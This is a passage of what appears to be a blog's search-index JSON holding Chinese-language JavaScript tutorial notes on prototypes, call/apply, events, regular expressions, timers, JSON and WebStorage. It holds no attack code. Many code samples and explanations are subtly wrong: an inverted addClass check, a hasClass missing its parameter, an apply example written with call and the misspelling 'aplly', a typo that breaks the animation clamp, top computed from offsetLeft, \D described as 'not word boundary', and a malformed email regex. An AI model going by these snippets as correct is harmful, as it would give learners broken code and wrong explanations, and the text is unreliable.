age)&#123;    this.name = name;    this.age = age;    this.sayName = function()&#123;        alert(this.name);    &#125;;&#125;var dog = new Dog(&quot;小白&quot;,5);\n\n\n使用同一个构造函数创建的对象，称为一类对象，也将一个构造函数称为一个类\n将通过一个构造函数创建的对象称为该类的实例\n\n使用instanceof可以检查一个对象是否是一个类的示例\n\n语法：对象 instanceof 构造函数\n示例：console.log(dog instanceof Person)      False\n\n\n构造函数每执行一次就会创建一个新的sayName方法，所有实例的sayName都是唯一的。为了提高性能，可将sayName在全局作用域定义。\n\nfunction Person(name, age, gender)&#123;    this.name = name;    this.age = age;    this.gender = gender;    this.sayName = fun;    &#125;;&#125;function fun()&#123;    alert(this.name);&#125;\n\n\n但将函数定义在全局作用域，污染了全局作用域的命名空间，且不安全（容易被覆盖）\n因此可以将将sayName在原型对象里定义\n\n构造函数+原型的组合模式\n套路：自定义构造函数，属性再函数中初始化，方法添加到原型上\n适用场景：需要创建多个类型确定的对象\n\nfunction Person(name, age, gender)&#123;    this.name = name;    this.age = age;    this.gender = gender;&#125;Person.prototype.sayName = function()&#123;    alert(this.name);&#125;;\n\n原型对象\n我们所创建的每一个函数，解析器都会向函数中添加一个属性prototype，这个属性对应着一个对象，这个对象称原型对象\n\n\n若函数以普通函数的形式调用，prototype没有任何作用\n若函数以构造函数的形式调用，它所创建的对象中都会有一个隐含的属性，指向该构造函数的原型对象，可通过___proto__来访问该属性\n\n\nconsole.log(mc.__proto__ == MyClass.prototype);//返回true\n\n\n原型对象就相当于一个公共区域，所有同一个类的实例都可以访问到这个原型对象。\n因此，创建构造函数时，可将对象中共有的属性和方法统一设置到原型对象中。（不用为每个对象创建属性，也不会影响到全局作用域）\n当访问对象的一个属性或方法时，会先在对象自身中寻找，若没有则会去原型对象中寻找。\n（若再没有则去原型的原型中寻找，直到找到Object对象的原型，Object对象的原型没有原型，如果在Object中依然没有找到，则返回undefined。\n\nfunction Person()&#123;    &#125;Person.prototype.sayName = function()&#123;    alert(this.name);&#125;;\n\n\n使用in检查对象中是否有某属性时，如果对象中没有但原型中有，也会返回true\n可使用对象的hasOwnProperty()来检查对象自身中是否有该属性\n\n","categories":["JavaScript"],"tags":["JS","对象","函数"]},{"title":"JS基础（五）：函数的方法call和apply","url":"/2022/03/09/JS%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%94%EF%BC%89%EF%BC%9A%E5%87%BD%E6%95%B0%E7%9A%84%E6%96%B9%E6%B3%95call%E5%92%8Capply/","content":"\ncall()和apply()，这两个方法都是函数对象的方法，需要通过函数对象来调用\n\nfunction fun()&#123;    alert(&quot;我是fun函数&quot;);&#125;//以下三者效果相同fun.call();fun.aplly();fun();\n\n\n在调用call()和apply()时，可以将一个对象指定为第一个参数\n此时这个对象将会成为函数执行时的this\n因此，利用call()和apply()可修改this\n\n\ncall()方法可以将实参在对象之后依次传递\napply()方法需要将实参封装到一个数组中统一传递\n\nfunction fun(a,b)&#123;    console.log(&quot;a=&quot;+a);    console.log(&quot;b=&quot;+b);&#125;;var obj = &#123;    name:&quot;obj&quot;;    sayName:function()&#123;        alert(this.name);    &#125;&#125;;fun.call(obj,2,3);  //this 为objfun.call(obj,[2,3]); //this 为obj\n\n","categories":["JavaScript"],"tags":["JS"]},{"title":"JS基础（八）：事件","url":"/2022/03/11/JS%E5%9F%BA%E7%A1%80%EF%BC%88%E5%85%AB%EF%BC%89%EF%BC%9A%E4%BA%8B%E4%BB%B6/","content":"事件对象\n当事件的响应函数被触发时，浏览器每次都会将一个事件对象作为实参传递进响应函数\n事件对象中封装了当前事件相关的一切信息，比如：鼠标的坐标、键盘按下的按键、鼠标滚轮滚动的方向\n\n\nonmousemove 该事件会在鼠标在元素中移动时被触发\nareaDiv.onmousemove = function(event)&#123;    //在IE8中，将事件对象作为window对象的属性保存的    //解决兼容问题    if(!event)&#123;        event=window.event;    &#125;    //另一种写法（常用）    event = event || window.event;        var x = event.clientX;    var y = event.clientY;        showMsg.innerHTML = &quot;x=&quot;+x+&quot;,y=&quot;+y;&#125;;\n\n事件的冒泡(Bubble)\n\n\n冒泡：指事件的向上传导，当后代元素上的事件被触发时，其祖先元素的相同事件也会被触发\n在实际开发中大部分情况冒泡时有益的，若不希望发生事件冒泡可以通过事件对象（event）来取消冒泡\n\n将事件对象的cancelBubble设置为true，即可取消冒泡\ns1.onclick = function(event)&#123;    alert(&quot;我是span的单击响应函数&quot;);    event.cancelBubble = true;&#125;\n\n\n\n事件的委派\n希望只绑定一次事件，即可应用到多个元素上，即使元素是后添加的\n委派：将事件统一绑定给元素的共同祖先元素，当后代元素上的事件触发时，会一直冒泡到祖先元素，从而通过祖先元素的响应函数来处理事件。\n事件委派利用了冒泡，可以减少事件的绑定次数，提高程序性能\n\n\nevent.target 返回触发事件的对象\n\n&lt;ul id=&quot;u1&quot;&gt;    &lt;li&gt;&lt;a href=&quot;javascript:;&quot; class=&quot;link&quot;&gt;超链接一&lt;/a&gt;&lt;/li&gt;    &lt;li&gt;&lt;a href=&quot;javascript:;&quot; class=&quot;link&quot;&gt;超链接二&lt;/a&gt;&lt;/li&gt;    &lt;li&gt;&lt;a href=&quot;javascript:;&quot; class=&quot;link&quot;&gt;超链接三&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;\n\nu1.onclick = function()&#123;    //如果触发事件的对象是我们期望的元素，则执行否则不执行    if (event.target.className == &quot;link&quot;)&#123;    \talert(&quot;我是ul的单击响应函数&quot;);    &#125;);\n\n事件的绑定\n使用 对象.事件 &#x3D; 函数 的形式绑定响应函数，只能同时为一个元素的一个事件绑定一个响应函数，不能绑定多个，若绑定了多个，则后面的会覆盖掉前面的\n\n\naddEventListener() 此方法也可以为元素绑定响应函数\n参数1：事件的字符串，不要on（click）\n参数2：回调函数，当事件触发时该函数会被调用\n参数3：是否在捕获阶段触发事件，需要一个布尔值，一般都是false\n\n它可同时为一个元素的相同事件同时绑定多个响应函数，这样当事件被触发时，响应函数将会按照函数的绑定顺序执行。\n这里的this是绑定事件的对象。\n\n\n\nbtn01.addEventListener(&quot;click&quot;,function()&#123;    alert(1);&#125;,false);btn01.addEventListener(&quot;click&quot;,function()&#123;    alert(2);&#125;,false);btn01.addEventListener(&quot;click&quot;,function()&#123;    alert(3);&#125;,false);\n\n​    IE8中不支持以上方法，可使用attachEvent()来绑定事件\n\nattachEvent() \n参数1：事件的字符串，要on （onclick）\n参数2：回调函数\n\n它可同时为一个元素的相同事件同时绑定多个响应函数，执行顺序与addEventListener()相反，先绑定的后执行。\n这里的this是window\n\n\nbind函数：用来为指定元素绑定响应函数\n参数1：obj 要绑定事件的对象\n参数2：eventStr 事件的字符串(不要on)\n参数3：callback 回调函数\nfunction bind(obj,eventStr,callback)&#123;    if(obj.addEventListener)&#123;        //大部分浏览器兼容方式        obj.addEventListener(eventStr,callbak,false);    &#125;else&#123;        /*        * this是谁由调用方式决定，通过call()修改this        * callback.call(obj)        * 但callback是浏览器调用的，可通过匿名函数方式代替        */        //IE8及以下    \tobj.attachEvent(&quot;on&quot;+eventStr,function()&#123;            //在匿名函数中调用回调函数            callback.call(obj);        &#125;);    &#125;&#125;bind(btn01,&quot;click&quot;,function()&#123;    alert(this);&#125;);\n\n拖拽事件\n当我们拖拽网页中的内容是，浏览器会默认区搜索引擎中搜索内容，\n此时会导致拖拽功能的异常，若不希望发生这个行为，则可通过return false来取消默认行为\n\n\n元素.setCapture() 设置当前元素捕获所有鼠标按下的事件\n\n滚轮事件\nonmousewheel 鼠标滚动时触发\nevent.wheelDelta 获取鼠标滚轮滚动的方向\n\n键盘事件\n键盘事件一般会绑定给一些可以获取到焦点的对象或者document\n\n\nonkeydown 按键被按下\n如果一直按着某个键不松，则事件会一直触发。当onkeydown连续触发时，第一次和第二次之间会间隔稍微长一点，其它次会非常快，为了防止误操作的发生。\n在文本框中输入内容属于onkeydown的默认行为，如果在onkeydown中取消了默认行为（return false），则输入的内容不会出现在文本框中。\ninput.onkeydown = function(event)&#123;    event = eventt || window.event;    //使文本框中不能输入数字    if(event.keyCode &gt;= 48 &amp;&amp; event.keyCode &lt;=57)&#123;        return false;    &#125;&#125;\n\nonkeyup 按键被松开\n\nevent.keyCode 获取按键的编码\nevent.altKey 判断alt是否被按下\nevent.ctrlKey 判断ctrl是否被按下\nevent.shiftKey 判断shift是否被按下\n\n示例：键盘上下左右移动div\n\n\nwindow.onload = function()&#123;    document.onkeydown = function(event)&#123;        event = event || window.event;        //定义一个变量，来表示移动的速度        var speed = 10;        //37左，38上，39右，40下        switch(event.keyCode)&#123;            case 37:                //向左                box1.style.left = box1.offsetLeft - speed + &quot;px&quot;;                break;            case 39:                //向右                box1.style.left = box1.offsetLeft + speed + &quot;px&quot;;                break;            case 38:                //向上                box1.style.top = box1.offsetLeft - speed + &quot;px&quot;;                break;            case 40:                //向下                box1.style.top = box1.offsetLeft + speed + &quot;px&quot;;                break;        &#125;    &#125;&#125;\n\n","categories":["JavaScript"],"tags":["JS","事件"]},{"title":"JS基础（六）：正则表达式","url":"/2022/03/09/JS%E5%9F%BA%E7%A1%80%EF%BC%88%E5%85%AD%EF%BC%89%EF%BC%9A%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","content":"创建正则表达式的对象\n语法：var 变量 &#x3D; new RegExp(“正则表达式”,”匹配模式”)；\ntest() 检查字符串是否符合正则表达式的规则\n\nvar reg = new RegExp(&quot;a&quot;);console.log(reg.test(&quot;a&quot;));  //trueconsole.log(reg.test(&quot;bcabc&quot;));  //trueconsole.log(reg.test(&quot;bcbc&quot;));  //false\n\n\n匹配模式：\ni 忽略大小写\ng 全局匹配模式\n\n\n\nvar reg = new RegExp(&quot;a&quot;,&quot;i&quot;);console.log(reg.test(&quot;A&quot;));  //trueconsole.log(reg.test(&quot;bcAbc&quot;));  //trueconsole.log(reg.test(&quot;bcbc&quot;));  //false\n\n正则语法\n创建正则表达式简单方法(字面量方式)\n语法：var 变量 &#x3D; &#x2F;正则表达式&#x2F;匹配模式\n使用字面量方式创建更加简单，使用构造函数创建更加灵活（因为可以传递正则表达式变量）\n\n\nvar reg = new RegExp(&quot;a&quot;);//相当于如下var reg = /a/i;\n\n\na|b   检查字符串中是否有a或b\n\n[abcd]  检查字符串中是否有a或b或c或d（[]中的内容也是或的关系)\n\n[a-z] 任意小写字母\n[A-Z] 任意大写字母\n[A-z] 任意字母\n\na[bde]c 检查字符串中是否含有abc或ade或aec\n\n[^ac] 含有除了ab的字母\n[^0-9] 除了数字\n\n量词：量词只对它前面的一个内容起作用\n\n{n} 正好连续出现n次\na{3} a连续出现3次\n(ab){3} ab连续出现3次\n\n{m,n} 出现m-n次\n\n{m，} 出现m次以上\n\n+，至少一个，相当于{1，}\n\n*，0个或多个，相当于{0，}\n\n？，0个或一个，相当于{0，1}\n\n\n\n^a 匹配以a开头  （与[^a]区分）\n\na$ 匹配以a结尾\n\n^a$ 完全匹配a\n如果在正则表达式中同时使用^ $则要求字符串必须完全符合正则表达式\n\n^a|a$ 以a开头或以a结尾\n\n示例：\n\n检查一个字符串是否是个合法手机号\n\n\n\n1\n3\n567890123\n\n\n\n以1开头\n第二位3-9\n第三位以后任意数字\n\n\n^1\n[3-9]\n[0-9]{9}$\n\n\nvar phoneStr = &quot;13067890123&quot;;var phoneReg = /^1[3-9][0-9]&#123;9&#125;$/;console.log(phoneReg.test(phoneStr));\n\n\n.    表示任意字符\n\n检查一个字符串中是否含有. （\\） \nvar reg = /\\./;reg = new RegExo(&quot;\\\\.&quot;);var reg = /\\\\/;reg = new RegExo(&quot;\\\\\\\\&quot;);\n\n\n\\w 表示任意字母、数字、下划线_\n\\W 表示除任意字母、数字、下划线_外\n\n\\d 表示任意的数字\n\\D 表示除了数字\n\n\\s 空格\n\\S 除了空格\n//删除开头的空格str = str.replace(/^\\s*/,&quot;&quot;)//删除结尾的空格str = str.replace(/\\s*$/,&quot;&quot;)//删除开头和结尾的空格str = str.replace(/^\\s*|\\s*$/g,&quot;&quot;)\n\n\\b 单词边界\n\\D 除了单词边界\nreg = /\\bchild\\b/;console.log(reg.test(hello children));//falseconsole.log(reg.test(hello child));//ture\n\n示例：\n\n电子邮件正则表达式\n\n\n\nhello.nihao\n@\nabc.com.cn\n\n\n\n任意字母数字下划线.任意字母数字下划线\n\n任意字母数字.任意字母（2-5位）.任意字母（2-5位）\n\n\n^\\w{3,} (\\.\\w+)*\n@\n[A-z0-9]+ (\\.[A-z]{2,5}){1,2}$\n\n\n\n\nvar emaiReg = /^\\w&#123;3,&#125;(\\\\.\\w+)*@[A-z0-9]+ (\\\\.[A-z]&#123;2,5&#125;)&#123;1,2&#125;$/\n\n\n\n补充：(16条消息) 正则表达式中\\1 \\2是什么意思_空城雀的博客-CSDN博客_two是什么意思\n\n单独斜杠的 \\1 ， \\2 就是反向引用了。‘\\1’ 匹配的是 所获取的第1个()匹配的引用。例如，’(\\d)\\1’ 匹配两个连续数字字符。如33aa 中的33‘\\2’ 匹配的是 所获取的第2个()匹配的引用。例如，’(\\d)(a)\\1’ 匹配第一是数字第二是字符a,第三\\1必须匹配第一个一样的数字重复一次，也就是被引用一次。如9a9 被匹配，但9a8不会被匹配，因为第三位的\\1必须是9才可以，\n‘(\\d)(a)\\2’ 匹配第一个是一个数字，第二个是a，第三个\\2必须是第二组（）中匹配一样的，如，8aa被匹配，但8ab，7a7不会被匹配，第三位必须是第二组字符的复制版，也是就引用第二组正则的匹配内容。————————————————原文链接：https://blog.csdn.net/liangf05/article/details/79361191\n\n字符串和正则表达式\n\n\nsplit()\n可以将一个字符串拆分为一个数组\n方法中可以传递一个正则表达式作为参数，那么将会根据正则表达式去拆分字符串\n不需要设置全局匹配\n\nvar str =&quot;1a2b3c4d5e6f7&quot;;//根据任意字母将字符串拆分var result = str.split(/[A-z]/);  //输出1，2，3，4，5，6，7\n\n\nsearch()可以搜索字符串中是否有指定内容\n不能设置全局匹配\n\nvar str =&quot;hello abc hello aec afc&quot;;var result = str.search(/a[bef]c/);  \n\n\nmatch()\n可以根据正则表达式，从一个字符串中将符合条件的内容提取出来\nmatch()会将匹配到的内容封装到一个数组中返回，即使只查询到一个结果\n\nvar str =&quot;1a2b3c4d5e6f7&quot;;var result = str.match(/[A-z]/); //输出a//全局匹配var result = str.match(/[A-z]/g); //输出a,b,c,d,e,fvar str =&quot;1a2b3c4d5e6f7A8B9C&quot;;//全局匹配+忽略大小写var result = str.match(/[a-z]/ig); //输出a,b,c,d,e,f,A,B,C\n\n\nreplace() \n可将字符串中指定内容替换为新的内容\n参数：\n\n被替换的内容，可接受一个正则表达式作为参数\n新的内容\n\n\nvar str =&quot;1a2b3c4d5e6f7&quot;;var result = str.replace(/[a-z]/ig,&quot;@&quot;); //输出1@2@3@4@5@6@7//删除字母var result = str.replace(/[a-z]/ig,&quot;&quot;); //输出1234567\n\n","categories":["JavaScript"],"tags":["JS","正则表达式"]},{"title":"JS基础（十一）：类的操作","url":"/2022/03/12/JS%E5%9F%BA%E7%A1%80%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89%EF%BC%9A%E7%B1%BB%E7%9A%84%E6%93%8D%E4%BD%9C/","content":"修改class属性//向一个元素中添加指定的class属性值function addClass(obj,cn)&#123;    if(hasClass(obj,cn))&#123;        obj.className += &quot;&quot;+cn;    &#125;&#125;//判断一个元素中是否含有指定的class属性值function hasClass(cn)&#123;    var reg = new RegExp(&quot;\\\\b&quot;+cn+&quot;\\\\b&quot;);    return reg.test(obj.className);&#125;//删除一个元素中指定的class属性值function removeClass(obj,cn)&#123;    var reg = new RegExp(&quot;\\\\b&quot;+cn+&quot;\\\\b&quot;);    obj.className = obj.className.replace(reg,&quot;&quot;);&#125;//切换class属性值，元素中有该类则删除，没有该类则添加function toggleClass(obj,cn)&#123;    if(hasClass(obj,cn))&#123;        removeClass(obj,cn);    &#125;else&#123;        addClass(obj,cn);    &#125;&#125;\n\n","categories":["JavaScript"],"tags":["JS","class"]},{"title":"JS基础（十二）：JSON","url":"/2022/03/12/JS%E5%9F%BA%E7%A1%80%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89%EF%BC%9AJSON/","content":"JSON简介\nJS中的对象只有JS自己认识，其它语言都不认识\nJSON是一个特殊格式的字符串，这个字符串可以被任意的语言所识别，并且可以转换为任意语言中的对象，JSON再开发中主要用来数据的交互\nJSON：Javascript Object Notation (JS对象表示法)\n\n\nJSON和JS对象的格式一样，但是JSON字符串中的属性名必须加双引号，其它和JS语法一致\nJSON中允许的值：\n字符串\n数值\n布尔值\nnull\n对象（除了函数对象）\n数组\n\n\n\nJSON分类\n对象 {}\nvar obj = &#x27;&#123;&quot;name&quot;:&quot;孙悟空&quot;,&quot;age&quot;:18,&quot;gender&quot;:&quot;男&quot;&#125;&#x27;;\n\n数组 []\nvar arr = &#x27;[1,2,3,&quot;hello&quot;,true]&#x27;;\n\n将JSON字符串转换为JS中的对象\nJS中为我们提供了一个工具类，就叫JSON\n这个对象可以将一个JSON转换为JS对象，也可以将JS对象转换为JSON\nJSON在ie7中不兼容，可用eval()：用来执行一段字符串形式的JS代码，并将执行结果返回，如果字符串中有{}，它会将其当成代码块解析，若不希望，则需要在字符串前后各加一个()。开发中尽量避免使用。还可以通过引入一个外部的js文件来处理，json2.js.\n\njson –&gt; js对象：JSON.parse()\n将json字符串转换为js对象，参数：json字符串\n\njs对象 –&gt; json：JSON.stringify()\n将js对象转换为json字符串，参数：js对象\n\n\n","categories":["JavaScript"],"tags":["JS","JSON"]},{"title":"JS基础（十）：定时器","url":"/2022/03/11/JS%E5%9F%BA%E7%A1%80%EF%BC%88%E5%8D%81%EF%BC%89%EF%BC%9A%E5%AE%9A%E6%97%B6%E5%99%A8/","content":"定时调用\n定时调用，可以使一段程序每隔一段时间执行一次\n\n\nsetInterval() 定时调用\n参数1：回调函数，该函数会每隔一段时间被调用一次\n参数2：每次调用间隔的时间，单位是毫秒\n返回值：返回一个Number类型的数据，这个数字用来作为定时器的唯一标识。\nvar num = 1;var timer = setInterval(function()&#123;    count.innerHTML = num++;    if(num == 11)&#123;        //关闭定时器       clearInterval(timer)    &#125;&#125;,1000);\n\n切换图片练习var img1 = document.getElementById(&quot;img1&quot;);var imgArr = [&quot;img/1.jpg&quot;,&quot;img/2.jpg&quot;,&quot;img/3.jpg&quot;,&quot;img/4.jpg&quot;];var index = 0;setInterval(function()&#123;    index = index % imgArr.length;    img1.src = imgArr[index];&#125;,1000);\n\n延时调用\n延时调用一个函数不马上执行，而是隔一段时间后再执行，且只会执行一次\n延时调用和定时调用实际上是可以相互代替的\n\n\nsetTimeout()\nvar time = setTimeout(function()&#123;    console.    log(num++);&#125;,3000);clearTimeout(timer);\n\n移动（动画）练习\n参数：\nobj：要执行动画的对象\nattr：要执行动画的样式，比如：left top width height\ntarget：执行动画的目标位置\nspeed：移动速度（正数向右，负数向左）\ncallback：回调函数，该函数会在动画执行完毕后执行\n\n\n\nfunction move(obj,attr,target,speed,callback)&#123;    //关闭上一个定时器    clearInterval(obj.timer);    //获取元素目前的位置    var current = parseInt(getStyle(obj,attr));    //判断速度是正负值    if(current&gt;target)&#123;        speed = -speed;    &#125;    //开启一个定时器    //向执行动画的对象中添加一个timer属性，用来保存它自己的定时器标识    obj.timer = setInterval(function()&#123;        var oldValue = parseInt(getStyle(obj,attr));        var newValue = oldValue + speed;        if((speed &lt; 0 &amp;&amp; newValue &lt; target) || (speed&gt;0 &amp;&amp; newValue &gt; target))&#123;            nawValue = target;        &#125;        obj.style[attr]=newValue + &quot;px&quot;;        if(newValue == target)&#123;            //达到目标，关闭定时器            clearInterval(obj.timer);            //动画执行完毕，调用回调函数            callback &amp;&amp; callback();        &#125;    &#125;,30)&#125;//定义一个函数，用来获取指定元素的当前样式//参数：obj 要获取样式的元素，name 要获取的样式名function getStyle(obj,name)&#123;    if(window.getComputedStyle)&#123;        //正常浏览器的方式        return getComputedStyle(obj,null)[name];    &#125;else&#123;        return obj.currentStyle[name];    &#125;&#125;\n\n\n将以上代码单独放在一个js文件中\n\n轮播图练习//点击超链接切换到指定图片//为所有超链接绑定单击响应函数for(var i=0;i&lt;allA.length;i++)&#123;    allA[i].num = i;    allA[i].onlick = function()&#123;        //关闭自动切换的定时器        clearInterval(timer);        //获取点击超链接的索引        index = this.num;        //修改正在选中的a        srtA();         //使用自定义的move函数来切换图片        move(imgList,&quot;left&quot;,-520*index,20,function()&#123;            //动画执行完毕，开启定时器            autoChange();        &#125;);    &#125;;&#125;//自动切换图片autoChange();//创建一个函数，设置选中的afunction setA()&#123;    //判断当前索引是否是最后一张图片    if(index &gt;= imgArr.length -1)&#123;        index =0;        //此时显示最后一张图片，和第一张一模一样        //通过css将最后一张切换成第一张        imgList.style.left = 0;    &#125;    //将所有a的背景颜色设置为红色\tfor(var i=0;i&lt;allA.length;i++)&#123;        allA[i].style.backgoundColor = &quot;&quot;;  //默认为红色    &#125;    //选中的a设置为黑色    allA[index].style.backgroundColor = &quot;blace&quot;;&#125;;var timer;//创建一个函数，用来开启自动切换图片function autoChange()&#123;    //开启定时器     timer = setInterval(function()&#123;        index %= imgArr.length;        move(imgList,&quot;left&quot;,-520*index,20,function()&#123;            //修改导航按钮,回调函数会在每次函数执行完毕后执行            setA()        &#125;);    &#125;,3000);&#125;\n\n","categories":["JavaScript"],"tags":["JS","定时器"]},{"title":"JS提升（一）：浏览器本地存储（WebStorage）","url":"/2022/04/08/JS%E6%8F%90%E5%8D%87%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8%EF%BC%88WebStorage%EF%BC%89/","content":"WebStorage(js 本地存储)\n存储内容大小一般支持5MB左右（不同浏览器可能还不一样)\n\n浏览器端通过window.sessionStorage和 window.localstorage属性来实现本地存储机制\n\n相关API：\n\nxxxStorage.setItem(&#39;key&#39;, &#39;value&#39;)\n该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值\n\nxxxStorage.getItem( &#39;key&#39;)\n该方法接受一个键名作为参数，返回键名对应的值\n\nxxxStorage.removeItem( &#39;key&#39;)\n该方法接受一个键名作为参数，并把该键名从存储中删除\n\nXXxStorage.clear()\n该方法会清空存储中的所有数据\n\n\n\n备注\n\nSessionStorage存储的内容会随着浏览器窗口关闭而消失\n\nLocalstorage存储的内容，需要手动清除才会消失\n\nxxxStorage.getItem(xxx)如果xxx对应的value获取不到，那么getItem()的返回值是null\n\nJSON.parse(null)的结果依然是null\n\n\n\n\nlocalStorage\n&lt;h2&gt;localStorage&lt;/h2&gt;&lt;button onclick=&quot;saveDate()&quot;&gt;点我保存数据&lt;/button&gt;&lt;br/&gt;&lt;button onclick=&quot;readDate()&quot;&gt;点我读数据&lt;/button&gt;&lt;br/&gt;&lt;button onclick=&quot;deleteDate()&quot;&gt;点我删除数据&lt;/button&gt;&lt;br/&gt;&lt;button onclick=&quot;deleteAllDate()&quot;&gt;点我清空数据&lt;/button&gt;&lt;br/&gt;&lt;script&gt;  let person = &#123;name:&quot;JOJO&quot;,age:20&#125;  function saveDate()&#123;    localStorage.setItem(&#x27;msg&#x27;,&#x27;localStorage&#x27;)    localStorage.setItem(&#x27;person&#x27;,JSON.stringify(person))  &#125;  function readDate()&#123;    console.log(localStorage.getItem(&#x27;msg&#x27;))    const person = localStorage.getItem(&#x27;person&#x27;)    console.log(JSON.parse(person))  &#125;  function deleteDate()&#123;    localStorage.removeItem(&#x27;msg&#x27;)    localStorage.removeItem(&#x27;person&#x27;)  &#125;  function deleteAllDate()&#123;    localStorage.clear()  &#125;&lt;/script&gt;\n\nsessionStorage\n&lt;h2&gt;sessionStorage&lt;/h2&gt;&lt;button onclick=&quot;saveDate()&quot;&gt;点我保存数据&lt;/button&gt;&lt;br/&gt;&lt;button onclick=&quot;readDate()&quot;&gt;点我读数据&lt;/button&gt;&lt;br/&gt;&lt;button onclick=&quot;deleteDate()&quot;&gt;点我删除数据&lt;/button&gt;&lt;br/&gt;&lt;button onclick=&quot;deleteAllDate()&quot;&gt;点我清空数据&lt;/button&gt;&lt;br/&gt;&lt;script&gt;  let person = &#123;name:&quot;JOJO&quot;,age:20&#125;  function saveDate()&#123;    sessionStorage.setItem(&#x27;msg&#x27;,&#x27;sessionStorage&#x27;)    sessionStorage.setItem(&#x27;person&#x27;,JSON.stringify(person))  &#125;  function readDate()&#123;    console.log(sessionStorage.getItem(&#x27;msg&#x27;))    const person = sessionStorage.getItem(&#x27;person&#x27;)    console.log(JSON.parse(person))  &#125;  function deleteDate()&#123;    sessionStorage.removeItem(&#x27;msg&#x27;)    sessionStorage.removeItem(&#x27;person&#x27;)  &#125;  function deleteAllDate()&#123;    sessionStorage.clear()  &#125;&lt;/script&gt;\n\n","categories":["JavaScript"],"tags":["WebStorage"]},{"title":"JS基础（四）：forEach","url":"/2022/03/09/JS%E5%9F%BA%E7%A1%80%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9AforEach/","content":"\nforEach()方法需要一个函数（名）作为参数\nIE8及以下的浏览器均不支持该方法\n\nvar arr=[&quot;孙悟空&quot;,&quot;猪八戒&quot;,&quot;沙和尚&quot;,&quot;唐僧&quot;,&quot;白骨精&quot;];//一般不这么写arr.forEach(fun);//一般这么写（通过匿名函数）,由浏览器直接调用arr.forEach(function(value,index,obj)&#123;    console.log(&quot;value=&quot;+value);    console.log(&quot;index=&quot;+index);    console.log(&quot;obj=&quot;+obj);&#125;);\n\n\n类似这种由我们创建但不由我们调用的函数，称为回调函数。\n数组中有几个元素函数就会执行几次，每次执行时，浏览器会将遍历到的元素以实参的形式传递进来。\n\n浏览器会在回调函数中传递三个参数：\n\n第一个参数，当前正在遍历的元素\n第二个参数，当前正在遍历的元素的索引\n第三个参数，正在遍历的数组本身\n\n","categories":["JavaScript"],"tags":["JS"]},{"title":"JS高级（一）：数据类型","url":"/2022/04/17/JS%E9%AB%98%E7%BA%A7%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/","content":"数据类型分类\n基本（值）类型\n\nString：任意字符串\nNumber：任意的数字\nboolean：true&#x2F;false\nundefined：undefined\nnull：null\n\n\n对象（引用）类型:\n\nObject：任意对象(无序)\nvar obj = &#123;    name:&#x27;Tom&#x27;,    age:12&#125;\n\nFunction：一种特别的对象（可以执行）\nfunction test()&#123;    var a = 3&#125;\n\nArray：一种特别的对象（数值下标属性，内部数据是有序的）\nvar arr = [3,&#x27;abc&#x27;]\n\n\n\n判断数据类型\ntypeof\n返回数据类型的字符串表达\n\n可以判断：undefined&#x2F;数值&#x2F;字符串&#x2F;Boolean&#x2F;function\n不能判断：null与object，object和array  (输出均为’object’)\n\n\ninstanceof\n判断对象的具体类型\nAinstanceof B,判断A是否是B的实例对象\n\n&#x3D;&#x3D;&#x3D;\n\n可以判断：undefined &#x2F; null\n\n\n\n//基本（值）类型var aconsole.log(a,typeof a,typeof a===&#x27;undefined&#x27;,a===undefined) //undefined &#x27;undefined&#x27; true truea=3console.log(typeof a===&#x27;number&#x27;) //truea=&#x27;atguigu&#x27;console.log(typeof a===&#x27;string&#x27;) //truea=trueconsole.log(typeof a===&#x27;boolean&#x27;) //truea=nullconsole.log(typeof a,a===null) //&#x27;object&#x27; true//对象（引用）类型var b1 = &#123;    b2:[1,&#x27;abc&#x27;,console.log],    b3:function()&#123;        console.log(&#x27;b3&#x27;)        return function()&#123;            return &#x27;xfzhang&#x27;        &#125;    &#125;&#125;console.log(b1 instanceof Object,b1 instanceof Array) //true falseconsole.log(b1.b2 instanceof Object,b1.b2 instanceof Array) //true trueconsole.log(b1.b3 instanceof Object,b1.b2 instanceof Function) //true trueconsole.log(typeof b1.b2) //&#x27;object&#x27;console.log(typeof b1.b3===&#x27;function&#x27;) //trueconsole.log(typeof b1.b2[2]===&#x27;function&#x27;) //trueb1.b2[2](4)   // 4console.log(b1.b3()())  //xfzhang\n\n相关问题\nundefined和null的区别？【面试题】\n\nundefined：定义了未赋值\nnull：定义了并赋值为null\n\n\n何时要赋值为null？\n\nnull的类型为基本类型，但type时输出为’object‘，看似矛盾\n\n初始赋值：当要定义一个对象时，还未确定其值，可赋初始值为null，表明将要赋值的为一个对象\n\n结束赋值：结束前，让指对象成为垃圾对象（被垃圾回收器回收）\n//起始var b = null  //初始值为null，表明将要赋值为对象…………//确定对象就赋值b = &#123;&#x27;name&#x27;:&#x27;Tom&#x27;,&#x27;age&#x27;:16&#125;//最后b = null  //给b指向的对象成为垃圾对象（被垃圾回收器回收）\n\n\n严格区分变量类型与数据类型？\n\n数据的类型\n\n基本类型\n对象类型\n\n\n变量的类型：变量内存值的类型\n\n基本类型：变量保存是基本类型的数据\n\n引用类型：变量保存的是地址值\nvar c &#x3D; {}\n\n\n\njs是弱类型的语言，变量本身没有类型（声明变量用var）\n\n\n\n\n","categories":["JavaScript"],"tags":["数据类型"]},{"title":"JS高级（七）：内存溢出与内存泄露","url":"/2022/04/19/JS%E9%AB%98%E7%BA%A7%EF%BC%88%E4%B8%83%EF%BC%89%EF%BC%9A%E5%86%85%E5%AD%98%E6%BA%A2%E5%87%BA%E4%B8%8E%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2/","content":"内存溢出\n一种程序运行出现的错误\n当程序运行需要的内存超过了剩余的内存时，就抛出内存溢出的错误\n\n内存泄漏\n占用的内存没有及时释放，不会报错\n\n内存泄漏积累多了就容易导致内存溢出\n\n常见的内存泄漏：\n\n意外的全局变量\nfunction fn()&#123;    a = new Array(100000)    //应该用var    console.log(a)&#125;fn()\n\n没有即使清理的计时器或回调函数\nsetInterval(function()&#123;   